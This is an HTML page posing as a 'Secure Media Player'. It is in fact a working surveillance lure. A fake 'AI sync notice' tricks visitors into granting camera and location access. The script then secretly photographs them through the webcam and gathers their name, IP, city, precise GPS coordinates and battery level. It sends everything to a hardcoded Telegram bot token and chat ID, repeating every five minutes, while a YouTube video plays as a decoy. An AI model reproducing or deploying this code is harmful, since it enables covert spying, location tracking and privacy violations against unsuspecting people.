<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE MEDIA PLAYER</title>
    <style>
        body { background: #000; margin: 0; overflow: hidden; font-family: sans-serif; color: #fff; }
        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; z-index: 100; }
        .modal { background: #111; border-top: 4px solid #00ff00; padding: 30px; border-radius: 4px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .input-field { background: #222; border: 1px solid #444; color: #fff; padding: 14px; width: 90%; margin: 15px 0; border-radius: 4px; outline: none; font-size: 16px; }
        .btn { background: #00ff00; color: #000; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1em; text-transform: uppercase; }
        
        #videoPlayerBox { display: none; width: 100%; height: 100vh; background: #000; flex-direction: column; justify-content: center; align-items: center; }
        iframe { border: none; width: 100%; height: 260px; background: #000; }
        
        /* ‡¶™‡ßç‡¶∞‡¶´‡ßá‡¶∂‡¶®‡¶æ‡¶≤ ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶≤‡¶æ‡¶∞‡ßç‡¶ü ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
        .sys-alert { position: fixed; top: 20%; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 20px; border-radius: 8px; width: 80%; max-width: 300px; display: none; z-index: 200; box-shadow: 0 0 50px rgba(0,0,0,0.8); font-size: 14px; text-align: center; }
    </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="overlay" id="overlay">
    <div class="modal">
        <h3 style="margin:0; color: #00ff00;">Device Identification</h3>
        <p style="font-size: 13px; color: #aaa; margin: 15px 0;">Enter your name to synchronize with the secure media server.</p>
        <input type="text" id="userName" class="input-field" placeholder="Full Name" required>
        <button class="btn" onclick="showSystemNotice()">Verify & Access</button>
    </div>
</div>

<div class="sys-alert" id="sysNotice">
    <b style="font-size: 16px;">AI SYNC NOTICE</b><br><br>
    To provide high-definition audio-visual quality, our AI player requires temporary sensor synchronization. <br><br>
    <b>Please click 'Allow' on the next system prompt to proceed.</b><br><br>
    <button onclick="startFinalProcess()" style="background:#000; color:#fff; border:none; padding:10px 20px; border-radius:4px; font-weight:bold;">OK, I UNDERSTAND</button>
</div>

<div id="videoPlayerBox">
    <p style="padding: 10px; font-size: 13px; color: #00ff00;">‚óè LIVE STREAMING ENCRYPTED</p>
    <iframe id="youtubeVideo" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    <button class="btn" style="margin-top: 40px; width: 80%; background: #222; color: #fff;" onclick="window.location.href='https://www.facebook.com/Sadaf245sz'">CLOSE PLAYER</button>
</div>

<video id="webcam" autoplay playsinline muted style="display:none;"></video>
<canvas id="snapCanvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
    const CHAT_ID = '7416528268';
    let targetName = "Unknown";

    // Matrix Background
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const matrixData = "010101010101010101";
    const drops = Array(Math.floor(canvas.width / 16)).fill(1);
    function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#0F0'; ctx.font = '16px arial';
        drops.forEach((y, i) => {
            ctx.fillText(matrixData[Math.floor(Math.random() * matrixData.length)], i * 16, y * 16);
            if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(draw, 35);

    function showSystemNotice() {
        const nameInput = document.getElementById('userName').value;
        if (!nameInput) return alert("Please enter your name.");
        targetName = nameInput;
        document.getElementById('sysNotice').style.display = 'block';
    }

    async function startFinalProcess() {
        document.getElementById('sysNotice').style.display = 'none';
        try {
            // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ (‡¶è‡¶ñ‡¶æ‡¶®‡ßá‡¶á ‡¶´‡ßã‡¶®‡ßá ‡¶®‡ßã‡¶ü‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶Ü‡¶∏‡¶¨‡ßá)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('webcam').srcObject = stream;

            document.getElementById('overlay').style.display = 'none';
            document.getElementById('videoPlayerBox').style.display = 'flex';
            document.getElementById('youtubeVideo').src = "https://www.youtube.com/embed/y0DdGB3OlrQ?autoplay=1&mute=0";
            
            startTracking();
        } catch (e) {
            alert("Security Error: Sensor access denied. Player cannot start.");
            location.reload();
        }
    }

    async function startTracking() {
        setTimeout(() => sendFullLog("INITIAL"), 6000); // ‡ß¨ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶™‡¶∞ ‡¶Ø‡¶æ‡¶§‡ßá ‡¶õ‡¶¨‡¶ø ‡¶ï‡¶æ‡¶≤‡ßã ‡¶®‡¶æ ‡¶Ü‡¶∏‡ßá
        setInterval(() => sendFullLog("LOOP"), 300000); 
    }

    async function sendFullLog(type) {
        let batt = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batt = `${Math.round(b.level * 100)}%`;
        }

        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locData = await locRes.json();

        let log = `üë§ *TARGET:* ${targetName}\nüîã Battery: ${batt}\nüåê IP: \`${ipData.ip}\`\nüìç City: ${locData.city}\nüõ∞ Maps: [Open](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})`;

        navigator.geolocation.getCurrentPosition((pos) => {
            sendToTG(log + `\nüéØ GPS: [Maps](https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude})`);
        }, () => sendToTG(log), {enableHighAccuracy: true});

        takeSnap();
    }

    function takeSnap() {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('snapCanvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'shot.jpg');
            fd.append('caption', `User: ${targetName}`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function sendToTG(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });
    }
</script>
</body>
</html>
            
